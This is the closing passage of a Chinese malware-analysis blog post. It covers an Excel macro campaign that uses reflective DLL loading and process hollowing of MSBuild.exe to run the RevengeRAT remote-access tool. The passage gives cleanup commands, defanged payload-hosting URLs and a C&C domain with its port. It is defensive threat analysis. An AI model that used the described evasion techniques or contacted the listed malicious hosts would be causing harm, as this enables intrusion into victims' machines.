+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569071085088.png" alt="1569071085088"></p>
+<h2 id="实施远控"><a href="#实施远控" class="headerlink" title="实施远控"></a>实施远控</h2><p>通过反射加载该DLL文件，执行方法==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，来创建傀儡进程，将获取到的EXE加载到==正常程序MSBuild.exe中==，来免杀。</p>
+<p>注入该傀儡进程的获取到的EXE文件，实质上是一个==远控==，通过查询互斥体，可知道该远控为<code>RevengeRAT</code>，该远控的C&amp;C服务器为：==meandmyjoggar.duckdns.org:777==，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569072354028.png" alt="1569072354028"></p>
+<p>由于该<code>RevengeRAT</code>远控是一个成熟的远控程序，网上也可以直接下载到该远控软件，这里就不过多去分析该远控程序。</p>
+<h1 id="0x02-查杀方案"><a href="#0x02-查杀方案" class="headerlink" title="0x02 查杀方案"></a>0x02 查杀方案</h1><ul>
+<li><p>关闭傀儡进程</p>
+<p>关闭创建的<code>MSBuild.exe</code>的傀儡进程。</p>
+</li>
+<li><p>删除计划任务</p>
+<p>删除创建的两个计划任务：<code>Windows Update</code>、<code>Update</code></p>
+<p>可执行如下指令删除计划任务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;Delete &#x2F;TN &quot;Windows Update&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;Delete &#x2F;TN Update&quot; &#x2F;F</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除开机自启动项</p>
+<p>删除注册表项==HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate==</p>
+</li>
+</ul>
+<h1 id="0x03-样本溯源"><a href="#0x03-样本溯源" class="headerlink" title="0x03 样本溯源"></a>0x03 样本溯源</h1><p>通过mshta访问的网址如下表：</p>
+<table>
+<thead>
+<tr>
+<th>捆绑恶意JS代码网址：</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>==http[:]//bit.ly/8hsshjahassahsh==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/nv5d9pYu==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/vXpe74L2==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/JdTuFmc5==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/CGe3S2Vf==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/wMG90xwi==</td>
+</tr>
+<tr>
+<td>==http[:]//pastebin.com/raw/W455MKAZ==</td>
+</tr>
+</tbody></table>
+<p>远控<code>RevengeRAT</code>的C&amp;C服务器：</p>
+<table>
+<thead>
+<tr>
+<th>C&amp;C服务器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>==meandmyjoggar.duckdns.org:777==</td>
+</tr>
+</tbody></table>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote>
+<p>该样本通过Excel进行传播，攻击手段高超，全程无文本攻击，其间进行了多次混淆，通过访问正常网址获取指令和数据，反射加载获取到的DLL文件流，来创建傀儡进程，最终执行远控程序。</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:A_zha0@163.com">Azha0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://azha0.github.io/2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%AE%8F%E7%97%85%E6%AF%92_APT/">https://azha0.github.io/2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%AE%8F%E7%97%85%E6%AF%92_APT/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Azha0.github.io" target="_blank">Azha0's Space</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%BF%9C%E6%8E%A7/">远控</a><a class="post-meta__tags" href="/tags/%E5%AE%8F%E7%97%85%E6%AF%92/">宏病毒</a><a class="post-meta__tags" href="/tags/%E5%A5%87%E5%85%B5%E8%AE%A1%E5%88%92/">奇兵计划</a><a class="post-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">样本分析报告</a><a class="post-meta__tags" href="/tags/APT/">APT</a><a class="post-meta__tags" href="/tags/%E9%9D%9EPE%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E6%A0%B7%E6%9C%AC/">非PE脚本语言样本</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/APT.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/CoinMiner.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">挖矿木马分析报告</div></div></a></div><div class="next-post pull-right"><a href="/2019/10/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/MALWARE.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">宏病毒分析报告</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting/BlogImg/myimg/avatar.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/friend_404.gif'" alt="avatar"/><div class="author-info__name">Azha0</div><div class="author-info__description">键盘敲烂，月薪过万!</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" href="mailto:A_zha0@163.com"><i class="fas fa-envelope"></i><span>联系我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Azha0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:A_zha0@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://github.com/Azha0" target="_blank" title="rss"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">今日任务：熬夜（1/1）</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x00 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.3.</span> <span class="toc-text">流程图</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 样本详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%8F"><span class="toc-number">2.1.</span> <span class="toc-text">查看宏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8JS%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">异常JS代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF"><span class="toc-number">2.3.</span> <span class="toc-text">添加计划任务和开机自启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CPowershell"><span class="toc-number">2.4.</span> <span class="toc-text">执行Powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.</span> <span class="toc-text">从网页获取文件数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96DLL%E6%96%87%E4%BB%B6%E6%B5%81"><span class="toc-number">2.5.1.</span> <span class="toc-text">1.获取DLL文件流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96exe%E6%96%87%E4%BB%B6%E6%B5%81"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.获取exe文件流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.6.</span> <span class="toc-text">反射动态加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.7.</span> <span class="toc-text">创建傀儡进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%A7%A3%E6%B7%B7%E6%B7%86"><span class="toc-number">2.7.1.</span> <span class="toc-text">1.解混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">2.7.2.</span> <span class="toc-text">2.创建进程并写入数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E8%BF%9C%E6%8E%A7"><span class="toc-number">2.8.</span> <span class="toc-text">实施远控</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%9F%A5%E6%9D%80%E6%96%B9%E6%A1%88"><span class="toc-number">3.</span> <span class="toc-text">0x02 查杀方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%A0%B7%E6%9C%AC%E6%BA%AF%E6%BA%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 样本溯源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/18_Sysrv-hello%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="Sysrv-hello携十八般武艺再度来袭"><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting/BlogImg/myimg/postimg/Botnets.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="Sysrv-hello携十八般武艺再度来袭"/></a><div class="content"><a class="title" href="/2021/03/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/18_Sysrv-hello%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="Sysrv-hello携十八般武艺再度来袭">Sysrv-hello携十八般武艺再度来袭</a><time datetime="2021-03-10T12:00:00.000Z" title="发表于 2021-03-10 20:00:00">2021-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/17_%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC-sxf-202103/" title="借鸡生蛋！驱动人生挖矿木马再填Outlaw僵尸网络模块"><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting/BlogImg/myimg/postimg/BTCMiner.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="借鸡生蛋！驱动人生挖矿木马再填Outlaw僵尸网络模块"/></a><div class="content"><a class="title" href="/2021/03/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/17_%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC-sxf-202103/" title="借鸡生蛋！驱动人生挖矿木马再填Outlaw僵尸网络模块">借鸡生蛋！驱动人生挖矿木马再填Outlaw僵尸网络模块</a><time datetime="2021-03-10T12:00:00.000Z" title="发表于 2021-03-10 20:00:00">2021-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/19/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ret-sync%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/" title="Ret-Sync+dsync动静同步插件"><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_工具使用/ret-sync配置说明/IDA.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="Ret-Sync+dsync动静同步插件"/></a><div class="content"><a class="title" href="/2021/01/19/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ret-sync%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/" title="Ret-Sync+dsync动静同步插件">Ret-Sync+dsync动静同步插件</a><time datetime="2021-01-19T13:00:00.000Z" title="发表于 2021-01-19 21:00:00">2021-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/16_Vidar%E7%AA%83%E5%AF%86%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="Vidar 窃密木马分析报告"><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/Vidar窃密木马分析报告/InfoStealer.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="Vidar 窃密木马分析报告"/></a><div class="content"><a class="title" href="/2021/01/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/16_Vidar%E7%AA%83%E5%AF%86%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="Vidar 窃密木马分析报告">Vidar 窃密木马分析报告</a><time datetime="2021-01-10T12:00:00.000Z" title="发表于 2021-01-10 20:00:00">2021-01-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/05/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E7%A0%B4%E8%A7%A3010Editor/" title="破解 010Editor"><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_奇技淫巧/破解010Editor/Cover.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/404.jpg'" alt="破解 010Editor"/></a><div class="content"><a class="title" href="/2020/12/05/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E7%A0%B4%E8%A7%A3010Editor/" title="破解 010Editor">破解 010Editor</a><time datetime="2020-12-05T12:00:00.000Z" title="发表于 2020-12-05 20:00:00">2020-12-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/APT.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Azha0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://Azha0.github.io">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
